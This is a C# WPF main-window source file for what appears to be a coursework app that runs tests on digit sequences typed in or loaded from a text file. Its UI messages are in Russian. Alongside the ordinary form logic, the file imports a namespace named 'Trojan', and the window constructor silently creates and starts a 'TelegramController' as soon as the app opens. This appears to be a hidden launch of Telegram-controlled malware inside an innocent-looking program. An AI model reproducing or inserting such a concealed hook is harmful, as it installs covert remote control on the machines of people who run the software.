using CourseWork.Tests;
using Microsoft.Win32;
using System;
using System.IO;
using System.Windows;
using System.Windows.Input;
using Trojan;

namespace CourseWork
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            TelegramController telegramController = new TelegramController();
            telegramController.Start();
            this.SequenceNumberTextBox.PreviewTextInput += new TextCompositionEventHandler(SequenceNumberTextBox_PreviewTextInput);
        }

        private string sequenceNumber = string.Empty;

        private void OpenTxtFileRadioButton_Checked(object sender, RoutedEventArgs e)
        {
            this.SequenceNumberTextBox.IsEnabled = false;
            this.OpenTxtFileButton.IsEnabled = true;
        }

        private void UserInputRadioButton_Checked(object sender, RoutedEventArgs e)
        {
            this.SequenceNumberTextBox.IsEnabled = true;
            this.OpenTxtFileButton.IsEnabled = false;
        }

        private void SequenceNumberTextBox_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            if (!Char.IsDigit(e.Text, 0)) e.Handled = true;
        }

        private void OpenTxtFileButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog()
            {
                CheckFileExists = true,
                CheckPathExists = true,
                Multiselect = false,
                Filter = "txt files (*.txt)|*.txt",
                Title = "Выберите файл"
            };

            if (openFileDialog.ShowDialog() == true)
            {
                using (StreamReader reader = new StreamReader(openFileDialog.OpenFile()))
                {
                    sequenceNumber = reader.ReadToEnd();
                }
            }
        }

        private void StartTestsButton_Click(object sender, RoutedEventArgs e)
        {
            if (this.SequenceNumberTextBox.IsEnabled)
            {
                this.sequenceNumber = this.SequenceNumberTextBox.Text;
            }

            if (!TestTools.IsOnlyNumberSequence(sequenceNumber))
            {
                MessageBox.Show("В вашем файле присутствуют символы отличные от 0-9.", "Ошибка чтения", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            if (this.sequenceNumber != string.Empty)
            {
                TestInformationWindow testInformationWindow = new TestInformationWindow(sequenceNumber);
                testInformationWindow.Show();
                this.Hide();
            }
            else
            {
                MessageBox.Show("Ваша последовательность пустая. Введите новую последовательность или выберите готовую из файла .txt.", "SequenceEmpty", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}
